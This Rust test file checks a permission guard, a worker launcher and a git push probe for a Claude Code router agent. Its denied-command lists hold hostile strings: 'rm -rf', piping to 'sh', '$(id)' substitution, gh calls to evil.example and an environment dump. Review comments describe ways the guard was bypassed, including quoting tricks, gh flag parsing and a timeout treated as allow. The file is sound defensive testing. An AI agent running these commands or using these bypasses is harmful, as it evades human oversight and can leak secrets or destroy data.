//! The router's enforcement surface (E-ROUTER close review): the PreToolUse guard
//! `scripts/router-guard.jq` as `.claude/settings.json` wires it, the headless launcher
//! `scripts/router-worker.sh` (with a stub `claude`) including its `wait` mode, and the shipped PUSHED watch probe.
//! Needs `jq`, `sh`, `uuidgen` and `shasum` on PATH, as the guard and launcher do.
use std::path::{Path, PathBuf};
use std::process::{Command, Output, Stdio};
use std::time::{Duration, Instant};
use tempfile::TempDir;

fn root() -> &'static Path {
    Path::new(env!("CARGO_MANIFEST_DIR"))
}

/// Run the guard on one PreToolUse input; Some(reason) = denied, None = allowed.
fn guard(agent: &str, tool: &str, input: serde_json::Value) -> Option<String> {
    let event = serde_json::json!({"agent_type": agent, "tool_name": tool, "tool_input": input, "cwd": "/r"});
    let mut p = Command::new("jq")
        .args(["-c", "-f"])
        .arg(root().join("scripts/router-guard.jq"))
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .unwrap();
    std::io::Write::write_all(&mut p.stdin.take().unwrap(), event.to_string().as_bytes()).unwrap();
    let o = p.wait_with_output().unwrap();
    assert!(o.status.success(), "guard errored on {event}");
    let out = String::from_utf8(o.stdout).unwrap();
    if out.trim().is_empty() {
        return None;
    }
    let v: serde_json::Value = serde_json::from_str(&out).unwrap();
    assert_eq!(v["hookSpecificOutput"]["permissionDecision"], "deny", "{out}");
    Some(v["hookSpecificOutput"]["permissionDecisionReason"].as_str().unwrap().to_string())
}

fn bash(cmd: &str) -> Option<String> {
    guard("router", "Bash", serde_json::json!({ "command": cmd }))
}

fn settings() -> serde_json::Value {
    serde_json::from_str(&std::fs::read_to_string(root().join(".claude/settings.json")).unwrap()).unwrap()
}

/// Blocker 1 of the close review: `--out""put=` (and kin) reached the shell as `--output=` because the
/// hook judged raw shell text by substring. Every documented shape still passes.
#[test]
fn router_bash_guard_judges_plain_words_so_shell_cannot_reassemble_a_denied_flag() {
    for denied in [
        r#"git log -1 --format=#!/bin/sh%n --out""put=scripts/router-worker.sh"#,
        "git log -1 --out''put=x",
        r"git log -1 --out\put=x",
        "git log -1 --out{put,}=x",
        "git log -1 --outp=x",
        "git show --output=x HEAD",
        "git log $(id)",
        "git log `id`",
        "git status; rm -rf x",
        "git log | sh",
        "git log > x",
        "git log\nrm x",
        "git log -- *.rs",
        "gh pr list -R evil.example/a/b",
        "gh pr list --repo=evil.example/a/b",
        // fix-round re-check: a -R inside a short-flag cluster, a PR URL, gh's jq over the environment
        "gh pr list -dR evil.example/a/b",
        "gh pr view -cRevil.example/a/b 1",
        "gh pr view https://evil.example/o/SECRET/pull/1",
        "gh pr list --json number -q env",
        "gh pr view 1 --web",
        "scripts/router-worker.sh spawn a ../x .router/briefs/a.md opus",
        "scripts/router-worker.sh wait ../x",
        "scripts/router-worker.sh wait n 15 x",
        "scripts/router-worker.sh wait n -1",
        "scripts/router-worker.sh wait N",
        "rm -rf x",
        "claude -p hi",
        "kill 1",
        "git -c core.pager=sh log",
    ] {
        assert!(bash(denied).is_some(), "guard allowed {denied:?}");
    }
    // DoS: an unbounded trim once ran past the hook's 10s timeout, which Claude Code treats as allow
    let t = Instant::now();
    assert!(bash(&format!("rm -rf x{}y", " ".repeat(100_000))).is_some());
    assert!(t.elapsed() < Duration::from_secs(3), "guard took {:?} on a long command", t.elapsed());

    let mut allowed = vec![
        "git log --oneline -5".to_string(),
        "git diff HEAD~1 HEAD^ -- src/main.rs".into(),
        "git log -1 --notes=mr --format=%N 9787799dccec525966570861689ccb6e2c2fc615".into(),
        "git show HEAD:src/main.rs".into(),
        "gh pr view 12 --json title,state".into(),
        "gh pr list --state open -L 5 --author vuluu".into(),
        "gh pr status".into(),
        "scripts/router-worker.sh spawn e-x-w1 /Users/o/Keel-x .router/briefs/e-x-w1.md opus".into(),
        "scripts/router-worker.sh resume e-x-w1 0b8a4f4e-1c2d-4e5f-8a9b-0c1d2e3f4a5b /Users/o/Keel-x .router/briefs/e-x-w1-r1.md sonnet".into(),
        "scripts/router-worker.sh wait e-x-w1".into(),
        "scripts/router-worker.sh wait e-x-w1 30".into(),
    ];
    // every permissions.allow entry is a shape the guard accepts (one source of truth, no drift)
    for a in settings()["permissions"]["allow"].as_array().unwrap() {
        let a = a.as_str().unwrap().strip_prefix("Bash(").unwrap().strip_suffix(')').unwrap();
        allowed.push(match a.strip_suffix(" *") {
            Some(p) if p.ends_with(" wait") => format!("{p} n 15"),
            Some(p) if p.starts_with("scripts/") => format!("{p} n /w .router/briefs/n.md opus"),
            Some(p) => format!("{p} HEAD"),
            None => a.to_string(),
        });
    }
    for ok in &allowed {
        assert_eq!(bash(ok), None, "guard denied documented shape {ok:?}");
    }
}

/// Review of 67b0de5: the guard must split gh's argv the way gh's flag parser (pflag) does. A
/// single-dash long name is a short flag plus an attached value to gh (`-label` = `-l abel`), so
/// the "value" after it becomes a flag of its own (`-label -R evil` really contacted evil.invalid);
/// a value starting with `-` is the same hole from the other side. Lists every leak, not the first.
#[test]
fn router_bash_guard_reads_gh_flags_as_gh_does() {
    let denied = [
        "gh pr list -label -R evil.example/a/b",
        "gh pr list -limit -R x/a/b",
        "gh pr list -author -R x/a/b",
        "gh pr list -label -q env --json number",
        "gh pr list -l -R x/a/b",
        "gh pr list -label --repo x/a/b",
        "gh pr list -author -w",
        // -s is --state to gh: only its enum check stops these today
        "gh pr list -state -R x/a/b",
        "gh pr list -search -R x/a/b",
        // gh has no -b/-h short today; one added later would make these live
        "gh pr list -base -R x/a/b",
        "gh pr list -head -R x/a/b",
        "gh pr view 1 -json -R x/a/b",
        // a value that is itself flag-shaped, and a short letter spelled as a long name
        "gh pr list --label -q env",
        "gh pr list --json=-R x/a/b",
        "gh pr list -L=-R x/a/b",
        "gh pr list --L 5",
    ];
    let leaks: Vec<_> = denied.iter().filter(|c| bash(c).is_none()).collect();
    assert!(leaks.is_empty(), "guard allowed {leaks:#?}");

    for ok in [
        "gh pr view 12 --json title,state",
        "gh pr list --state open -L 5 --author vuluu",
        "gh pr list -L=5 -s=open",
        "gh pr status",
        "gh pr status --json=a,b",
        "gh pr list -l bug -A vuluu -B main -H wu/x -S fix --label x --limit 3 --base main --head x --search y",
    ] {
        assert_eq!(bash(ok), None, "guard denied documented shape {ok:?}");
    }
}

/// Blocker 2 of the close review: `Agent`-tool subagents report their own agent_type, so the router
/// guard never sees them; the router may not start one, nor use any tool its agent file omits.
#[test]
fn router_guard_confines_the_router_to_its_tools_and_leaves_other_agents_alone() {
    for t in ["Agent", "Task", "Edit", "MultiEdit", "NotebookEdit", "Monitor", "SendMessage", "mcp__x__y"] {
        assert!(guard("router", t, serde_json::json!({})).is_some(), "router may use {t}");
    }
    assert!(guard("router", "Skill", serde_json::json!({"skill": "code-review"})).is_some());
    assert_eq!(guard("router", "Skill", serde_json::json!({"skill": "keel-router"})), None);
    assert_eq!(guard("router", "Read", serde_json::json!({"file_path": "/etc/hosts"})), None);
    assert_eq!(guard("router", "Write", serde_json::json!({"file_path": "/r/.router/briefs/w1.md"})), None);
    for p in ["/r/.router/briefs/../x.md", "/r/scripts/router-worker.sh", "/r/.router/briefs/sub/x.md", "/r/.router/briefs/.x.md"] {
        assert!(guard("router", "Write", serde_json::json!({ "file_path": p })).is_some(), "router may Write {p}");
    }
    for a in ["worker", "general-purpose"] {
        assert_eq!(guard(a, "Bash", serde_json::json!({"command": "rm -rf x; claude -p hi"})), None);
        assert_eq!(guard(a, "Agent", serde_json::json!({})), None);
    }

    // the guard's tool list is exactly router.md's tools: line
    let agent = std::fs::read_to_string(root().join(".claude/agents/router.md")).unwrap();
    let mut md: Vec<&str> = agent.lines().find_map(|l| l.strip_prefix("tools:")).unwrap().split(',').map(str::trim).collect();
    let jq = std::fs::read_to_string(root().join("scripts/router-guard.jq")).unwrap();
    let def = jq.lines().find_map(|l| l.strip_prefix("def tools: [")).unwrap();
    let mut g: Vec<&str> = def.split(']').next().unwrap().split(',').map(|s| s.trim().trim_matches('"')).collect();
    md.sort();
    g.sort();
    assert_eq!(md, g, "router.md tools: and the guard's tools differ");
    assert!(!md.contains(&"Agent"), "router.md grants Agent");
}

/// Important of the close review: a hook that errors (no jq, no guard file) must deny, not allow.
#[test]
fn settings_run_the_guard_on_every_tool_and_fail_closed() {
    let pre = settings()["hooks"]["PreToolUse"].as_array().unwrap().clone();
    assert_eq!(pre.len(), 1, "one PreToolUse group: the guard");
    assert!(pre[0].get("matcher").is_none(), "the guard must see every tool");
    let cmd = pre[0]["hooks"][0]["command"].as_str().unwrap().to_string();
    let run = |dir: &Path, path: &str| {
        let mut p = Command::new("/bin/sh")
            .args(["-c", &cmd])
            .env("CLAUDE_PROJECT_DIR", dir)
            .env("PATH", path)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .unwrap();
        let ev = r#"{"agent_type":"router","tool_name":"Agent","tool_input":{}}"#;
        std::io::Write::write_all(&mut p.stdin.take().unwrap(), ev.as_bytes()).unwrap();
        p.wait_with_output().unwrap()
    };
    let path = std::env::var("PATH").unwrap();
    let o = run(root(), &path);
    assert!(o.status.success() && String::from_utf8_lossy(&o.stdout).contains("\"deny\""), "{o:?}");
    let empty = TempDir::new().unwrap();
    assert_eq!(run(empty.path(), &path).status.code(), Some(2), "missing guard file must block");
    assert_eq!(run(root(), empty.path().to_str().unwrap()).status.code(), Some(2), "missing jq must block");
}

fn git(d: &Path, a: &[&str]) -> Output {
    let o = Command::new("git")
        .args(["-c", "core.hooksPath=/dev/null", "-c", "commit.gpgsign=false"])
        .args(a)
        .current_dir(d)
        .env("GIT_AUTHOR_NAME", "t")
        .env("GIT_AUTHOR_EMAIL", "t@t")
        .env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@t")
        .output()
        .unwrap();
    assert!(o.status.success(), "git {a:?}: {}", String::from_utf8_lossy(&o.stderr));
    o
}

struct Launcher {
    _d: TempDir,
    main: PathBuf,
    wt: PathBuf,
    wt2: PathBuf,
    stub: PathBuf,
}

/// A repo whose main checkout holds the launcher, two linked worktrees, a stub claude and a `sleep`
/// shim. The stub prints its argv and sleeps $STUB_SLEEP seconds, or, when $STUB_RELEASE is set, runs
/// until that file exists or the test process ($STUB_OWNER) is gone (so a panicking test leaks no stub
/// past the test binary). While held it keeps a subshell piped to `cut -c` (long-lived children that
/// are not `<shell> -c`, as an MCP server is), and runs a `sh -c` child, as a Bash tool command runs,
/// while $STUB_RELEASE.busy exists.
fn launcher() -> Launcher {
    let d = TempDir::new().unwrap();
    let base = d.path().canonicalize().unwrap();
    let main = base.join("main");
    std::fs::create_dir_all(main.join("scripts")).unwrap();
    std::fs::create_dir_all(main.join(".router/briefs")).unwrap();
    std::fs::copy(root().join("scripts/router-worker.sh"), main.join("scripts/router-worker.sh")).unwrap();
    std::fs::write(main.join(".gitignore"), ".router/\n").unwrap();
    std::fs::write(main.join(".router/briefs/b.md"), "do the thing\n").unwrap();
    git(&main, &["init", "-q", "-b", "main"]);
    git(&main, &["add", "."]);
    git(&main, &["commit", "-qm", "base"]);
    git(&main, &["worktree", "add", "-q", "../wt", "-b", "w"]);
    git(&main, &["worktree", "add", "-q", "../wt2", "-b", "w2"]);
    let stub = base.join("claude");
    std::fs::write(&stub, concat!(
        "#!/bin/sh\necho \"stub $*\"\n",
        "if [ -z \"${STUB_RELEASE:-}\" ]; then sleep \"${STUB_SLEEP:-3}\"; exit; fi\n",
        "held() { [ ! -e \"$STUB_RELEASE\" ] && kill -0 \"$STUB_OWNER\" 2>/dev/null; }\n",
        "(while held; do sleep 0.05; done) | cut -c 1 &\n",
        "while held; do\n",
        "  [ ! -e \"$STUB_RELEASE.busy\" ] || sh -c 'while [ -e \"$STUB_RELEASE.busy\" ] && [ ! -e \"$STUB_RELEASE\" ] && kill -0 \"$STUB_OWNER\" 2>/dev/null; do sleep 0.05; done; :'\n",
        "  sleep 0.05\ndone\nwait\n"
    )).unwrap();
    std::fs::set_permissions(&stub, std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
    // `wait` sleeps once per poll; this shim counts the polls in $STEP_DIR/polls and blocks poll n
    // until the test creates $STEP_DIR/go-n, so each poll judges a state the test has set
    std::fs::create_dir_all(base.join("shim")).unwrap();
    std::fs::write(base.join("shim/sleep"), concat!(
        "#!/bin/sh\nn=$(( $(cat \"$STEP_DIR/polls\" 2>/dev/null || echo 0) + 1 ))\n",
        "echo \"$n\" > \"$STEP_DIR/polls.tmp\" && mv \"$STEP_DIR/polls.tmp\" \"$STEP_DIR/polls\"\n",
        "while [ ! -e \"$STEP_DIR/go-$n\" ] && kill -0 \"$STUB_OWNER\" 2>/dev/null; do /bin/sleep 0.02; done\n"
    )).unwrap();
    std::fs::set_permissions(base.join("shim/sleep"), std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
    Launcher { main, wt: base.join("wt"), wt2: base.join("wt2"), stub, _d: d }
}

impl Launcher {
    fn run(&self, args: &[&str], sleep: &str) -> (bool, String) {
        self.run_env(args, &[("STUB_SLEEP", sleep)])
    }

    fn cmd(&self, args: &[&str], env: &[(&str, &str)]) -> Command {
        let mut c = Command::new("sh");
        c.arg("scripts/router-worker.sh")
            .args(args)
            .current_dir(&self.main)
            .env("ROUTER_CLAUDE", &self.stub)
            .env("CLAUDE_CONFIG_DIR", self.main.parent().unwrap().join("config"))
            .env("ROUTER_WAIT_POLL", "0.2")
            .envs(env.iter().copied());
        c
    }

    fn run_env(&self, args: &[&str], env: &[(&str, &str)]) -> (bool, String) {
        let o = self.cmd(args, env).output().unwrap();
        (o.status.success(), format!("{}{}", String::from_utf8_lossy(&o.stdout), String::from_utf8_lossy(&o.stderr)))
    }

    /// Start `wait` in the background, as the router runs it, its polls stepped by the test.
    fn wait_stepped(&self, args: &[&str], k: &str) -> Stepped {
        let base = self.main.parent().unwrap();
        let dir = base.join(format!("steps-{k}"));
        std::fs::create_dir_all(&dir).unwrap();
        let path = format!("{}:{}", base.join("shim").display(), std::env::var("PATH").unwrap());
        let owner = std::process::id().to_string();
        let env = [("STEP_DIR", dir.to_str().unwrap()), ("STUB_OWNER", owner.as_str()), ("PATH", path.as_str())];
        let child = self.cmd(args, &env).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().unwrap();
        Stepped { child, dir }
    }

    /// Spawn or resume worker n, held alive until `release` is created; returns the launcher's line.
    fn hold(&self, args: &[&str], release: &Path) -> String {
        let owner = std::process::id().to_string();
        let (ok, out) = self.run_env(args, &[("STUB_RELEASE", release.to_str().unwrap()), ("STUB_OWNER", owner.as_str())]);
        assert!(ok && out.starts_with("RUNNING"), "{out}");
        out
    }

    /// The session transcript `wait` reads for this spawn, under the stubbed CLAUDE_CONFIG_DIR.
    fn transcript(&self, wt: &Path, sid: &str) -> PathBuf {
        let enc: String = wt.to_str().unwrap().chars().map(|c| if c.is_ascii_alphanumeric() { c } else { '-' }).collect();
        let dir = self.main.parent().unwrap().join("config/projects").join(enc);
        std::fs::create_dir_all(&dir).unwrap();
        dir.join(format!("{sid}.jsonl"))
    }

    /// Wait (bounded) until the worker recorded in <name>.pid has exited.
    fn wait_exit(&self, name: &str) {
        let pid = std::fs::read_to_string(self.main.join(format!(".router/out/{name}.pid"))).unwrap();
        let t = Instant::now();
        while Command::new("kill").args(["-0", pid.trim()]).stderr(Stdio::null()).status().unwrap().success() {
            assert!(t.elapsed() < Duration::from_secs(20), "stub worker never exited");
            std::thread::sleep(Duration::from_millis(100));
        }
    }
}

fn field<'a>(out: &'a str, k: &str) -> &'a str {
    out.split_whitespace().find_map(|w| w.strip_prefix(k)).unwrap_or_else(|| panic!("no {k} in {out}"))
}

/// The launcher's refusals (none had a test before the close review) and the two importants it
/// fixed: one live run per name, and <name>.out holding only the latest run's report.
#[test]
fn launcher_refuses_unsafe_targets_binds_resume_and_runs_one_worker_per_name() {
    let l = launcher();
    let wt = l.wt.to_str().unwrap();
    let wt2 = l.wt2.to_str().unwrap();
    let main = l.main.to_str().unwrap();
    let brief = ".router/briefs/b.md";
    for (args, why) in [
        (vec!["spawn", "n", main, brief, "opus"], "may not run in"),
        (vec!["spawn", "n", "/tmp", brief, "opus"], "not a registered worktree"),
        (vec!["spawn", "-n", wt, brief, "opus"], "bad name"),
        (vec!["spawn", "n", wt, brief, "gpt"], "model must be"),
        (vec!["spawn", "n", wt, "scripts/router-worker.sh", "opus"], "file must be a .md under"),
    ] {
        let (ok, out) = l.run(&args, "0");
        assert!(!ok && out.contains(why), "{args:?} not refused for {why}: {out}");
    }
    std::os::unix::fs::symlink(l.main.join(".router/briefs/b.md"), l.main.join(".router/briefs/s.md")).unwrap();
    let (ok, out) = l.run(&["spawn", "n", wt, ".router/briefs/s.md", "opus"], "0");
    assert!(!ok && out.contains("symlinks refused"), "{out}");

    let (ok, out) = l.run(&["spawn", "n", wt, brief, "haiku"], "4");
    assert!(ok && out.starts_with("RUNNING"), "{out}");
    let sid = field(&out, "session=").to_string();
    let copy = field(&out, "brief=").to_string();
    assert!(copy.starts_with(wt) && std::fs::read_to_string(&copy).unwrap() == "do the thing\n", "{out}");

    // a second run under a live name is refused, spawn or resume
    let (ok, out) = l.run(&["spawn", "n", wt2, brief, "haiku"], "0");
    assert!(!ok && out.contains("still running"), "{out}");
    let (ok, out) = l.run(&["resume", "n", &sid, wt, brief, "haiku"], "0");
    assert!(!ok && out.contains("still running"), "{out}");
    l.wait_exit("n");

    // resume is bound to the spawn's name, session and worktree
    let (ok, out) = l.run(&["resume", "n", &sid, wt2, brief, "haiku"], "0");
    assert!(!ok && out.contains("was spawned in"), "{out}");
    let (ok, out) = l.run(&["resume", "m", &sid, wt, brief, "haiku"], "0");
    assert!(!ok && out.contains("no recorded spawn"), "{out}");
    let (ok, out) = l.run(&["resume", "n", &sid, wt, brief, "haiku"], "3");
    assert!(ok && out.starts_with("RUNNING"), "{out}");
    l.wait_exit("n");

    let log = std::fs::read_to_string(l.main.join(".router/out/n.out")).unwrap();
    assert_eq!(log.matches("stub ").count(), 1, "n.out must hold only the latest run:\n{log}");
    assert!(log.contains(&format!("--resume {sid}")), "{log}");
}

/// Blockers 3-4 of the close review: the shipped PUSHED probe fired before anything was pushed
/// (equality with local main), and worker-ops' variant never fired for an epic (equality with the
/// signed tip, which a --no-ff merge does not push). It must be false when staged, false when merged
/// locally, true once pushed.
#[test]
fn pushed_probe_fires_only_after_the_merge_reaches_origin() {
    let cmds = std::fs::read_to_string(root().join("skills/keel-router/references/commands.md")).unwrap();
    let line = cmds.lines().find(|l| l.trim_end().ends_with("echo PUSHED")).expect("no PUSHED probe in commands.md");
    let probe = line.strip_prefix("until ").unwrap().split("; do").next().unwrap();
    let ops = std::fs::read_to_string(root().join("skills/keel-router/references/worker-ops.md")).unwrap();
    let row = ops.lines().find(|l| l.starts_with("| pushes")).unwrap();
    assert!(row.contains("merge-base --is-ancestor <tip> origin/<b>"), "worker-ops push probe drifted from commands.md: {row}");

    let d = TempDir::new().unwrap();
    let origin = d.path().join("origin.git");
    let main = d.path().join("main");
    git(d.path(), &["init", "-q", "--bare", "-b", "main", origin.to_str().unwrap()]);
    git(d.path(), &["clone", "-q", origin.to_str().unwrap(), main.to_str().unwrap()]);
    git(&main, &["commit", "-q", "--allow-empty", "-m", "base"]);
    git(&main, &["push", "-q", "origin", "main"]);
    git(&main, &["switch", "-q", "-c", "epic/E-X"]);
    git(&main, &["commit", "-q", "--allow-empty", "-m", "epic work"]);
    let t = String::from_utf8(git(&main, &["rev-parse", "HEAD"]).stdout).unwrap().trim().to_string();
    git(&main, &["switch", "-q", "main"]);
    let fires = || Command::new("sh").args(["-c", probe]).env("MAIN", &main).env("T", &t).output().unwrap().status.success();

    assert!(!fires(), "PUSHED fired when the action was only staged");
    git(&main, &["merge", "-q", "--no-ff", "-m", "merge epic", "epic/E-X"]);
    assert!(!fires(), "PUSHED fired before the push");
    git(&main, &["push", "-q", "origin", "main"]);
    assert!(fires(), "PUSHED did not fire after the push");
}

fn age(path: &Path, secs: u64) {
    let f = std::fs::OpenOptions::new().create(true).append(true).open(path).unwrap();
    f.set_modified(std::time::SystemTime::now() - Duration::from_secs(secs)).unwrap();
}

/// Bounded wait for a condition another process brings about.
fn until(what: &str, mut cond: impl FnMut() -> bool) {
    let t = Instant::now();
    while !cond() {
        assert!(t.elapsed() < Duration::from_secs(10), "timed out waiting for {what}");
        std::thread::sleep(Duration::from_millis(10));
    }
}

/// Whether `pid` has a `<shell> -c` child, i.e. the stub is busy.
fn has_shell_child(pid: &str) -> bool {
    let o = Command::new("ps").args(["-A", "-o", "ppid=,command="]).output().unwrap();
    String::from_utf8(o.stdout).unwrap().lines().any(|l| {
        let w: Vec<&str> = l.split_whitespace().collect();
        w.len() > 2 && w[0] == pid && w[1].ends_with("sh") && w[2] == "-c"
    })
}

struct Stepped {
    child: std::process::Child,
    dir: PathBuf,
}

impl Stepped {
    /// Block until `wait` has judged poll n and is sleeping; panics with its line if it returned instead.
    fn at(&mut self, n: u32) {
        let polls = || std::fs::read_to_string(self.dir.join("polls")).ok().and_then(|s| s.trim().parse::<u32>().ok());
        let t = Instant::now();
        while polls() != Some(n) {
            if self.child.try_wait().unwrap().is_some() {
                let mut out = String::new();
                std::io::Read::read_to_string(self.child.stdout.as_mut().unwrap(), &mut out).unwrap();
                panic!("wait returned before poll {n}: {out}");
            }
            assert!(t.elapsed() < Duration::from_secs(10), "wait never reached poll {n}");
            std::thread::sleep(Duration::from_millis(10));
        }
    }

    fn go(&self, n: u32) {
        std::fs::write(self.dir.join(format!("go-{n}")), "").unwrap();
    }

    /// The one line `wait` prints once released from its last poll.
    fn line(mut self) -> String {
        let t = Instant::now();
        while self.child.try_wait().unwrap().is_none() {
            if t.elapsed() > Duration::from_secs(10) {
                self.child.kill().unwrap();
                panic!("wait never returned");
            }
            std::thread::sleep(Duration::from_millis(10));
        }
        let o = self.child.wait_with_output().unwrap();
        assert!(o.status.success(), "{o:?}");
        String::from_utf8(o.stdout).unwrap()
    }
}

/// E-SEED2.W8: `wait <name> [<stall-min>]` blocks while the worker runs and returns one line when it
/// exits (EXITED) or stalls (STALLED: on two polls running, no `sh -c` child and every transcript of its
/// newest run, main and subagent, idle past the threshold, naming the newest; the pid file when no
/// transcript exists). Polls are stepped through the `sleep` shim, so each judges a state the test set.
/// Bad input exits 2.
#[test]
fn wait_blocks_until_the_worker_exits_or_stalls() {
    let l = launcher();
    let wt = l.wt.to_str().unwrap();
    let brief = ".router/briefs/b.md";
    let base = l.main.parent().unwrap().to_path_buf();
    let release = |k: u8| base.join(format!("release-{k}"));
    std::fs::create_dir_all(l.main.join(".router/out")).unwrap();
    std::fs::write(l.main.join(".router/out/orphan.pid"), "1\n").unwrap();
    for (args, why) in [
        (vec!["wait"], "wait <name>"),
        (vec!["wait", "n", "1", "x"], "wait <name>"),
        (vec!["wait", "-n"], "bad name"),
        (vec!["wait", "n", "0"], "stall-min"),
        (vec!["wait", "n", "x"], "stall-min"),
        (vec!["wait", "n", ""], "stall-min"),
        (vec!["wait", "ghost"], "no worker ghost"),
        (vec!["wait", "orphan"], "no recorded run for orphan"),
    ] {
        let (ok, out) = l.run_env(&args, &[]);
        assert!(!ok && out.contains(why), "{args:?} not refused for {why}: {out}");
    }

    // exits: still waiting while the worker lives, EXITED once it is gone
    let out = l.hold(&["spawn", "n", wt, brief, "haiku"], &release(1));
    let sid = field(&out, "session=").to_string();
    let pid = field(&out, "pid=").to_string();
    let mut w = l.wait_stepped(&["wait", "n"], "exit");
    w.at(1);
    std::fs::write(release(1), "").unwrap();
    l.wait_exit("n");
    w.go(1);
    let out = w.line();
    assert!(out.starts_with(&format!("EXITED name=n pid={pid} ")) && out.lines().count() == 1, "{out}");
    let (ok, out) = l.run_env(&["wait", "n"], &[]);
    assert!(ok && out.starts_with("EXITED name=n ") && out.lines().count() == 1, "an exited worker returns at once: {out}");

    // quiet, then busy (a command ran), then quiet: the busy poll resets, so STALLED needs two more
    let tr = l.transcript(&l.wt, &sid);
    let out = l.hold(&["resume", "n", &sid, wt, brief, "haiku"], &release(2));
    let pid = field(&out, "pid=").to_string();
    age(&tr, 120);
    let busy = base.join("release-2.busy");
    let mut w = l.wait_stepped(&["wait", "n", "1"], "busy");
    w.at(1);
    std::fs::write(&busy, "").unwrap();
    until("busy stub", || has_shell_child(&pid));
    w.go(1);
    w.at(2);
    std::fs::remove_file(&busy).unwrap();
    until("idle stub", || !has_shell_child(&pid));
    age(&tr, 120);
    w.go(2);
    w.at(3);
    w.go(3);
    let out = w.line();
    assert!(out.starts_with(&format!("STALLED name=n pid={pid} idle=2m since={}\n", tr.display())), "{out}");

    // quiet, then a subagent writes, then quiet: the fresh poll resets; the newest transcript is named
    let sub = tr.with_extension("").join("subagents/agent-a.jsonl");
    std::fs::create_dir_all(sub.parent().unwrap()).unwrap();
    age(&tr, 180);
    let mut w = l.wait_stepped(&["wait", "n", "1"], "fresh");
    w.at(1);
    std::fs::write(&sub, "{}\n").unwrap();
    w.go(1);
    w.at(2);
    age(&sub, 120);
    w.go(2);
    w.at(3);
    w.go(3);
    let out = w.line();
    assert!(out.starts_with("STALLED name=n ") && out.ends_with(&format!(" idle=2m since={}\n", sub.display())), "{out}");

    // no transcript: the pid file's age stands in
    std::fs::remove_file(&tr).unwrap();
    std::fs::remove_dir_all(tr.with_extension("")).unwrap();
    age(&l.main.join(".router/out/n.pid"), 120);
    let mut w = l.wait_stepped(&["wait", "n", "1"], "pid");
    w.at(1);
    w.go(1);
    let out = w.line();
    assert!(out.starts_with("STALLED name=n ") && out.contains("since=") && out.trim_end().ends_with("n.pid"), "{out}");
    std::fs::write(release(2), "").unwrap();
    l.wait_exit("n");
    assert!(std::fs::read_to_string(l.main.join(".router/out/n.out")).unwrap().starts_with("stub "), "wait touched n.out");

    // a name spawned again (new session, other worktree) is judged by its newest run only
    let out = l.hold(&["spawn", "n", l.wt2.to_str().unwrap(), brief, "haiku"], &release(3));
    let tr2 = l.transcript(&l.wt2, field(&out, "session="));
    std::fs::write(&tr, "{}\n").unwrap();
    age(&tr2, 120);
    let mut w = l.wait_stepped(&["wait", "n", "1"], "newest");
    w.at(1);
    w.go(1);
    let out = w.line();
    assert!(out.ends_with(&format!(" since={}\n", tr2.display())), "{out}");
    std::fs::write(release(3), "").unwrap();
    l.wait_exit("n");
}
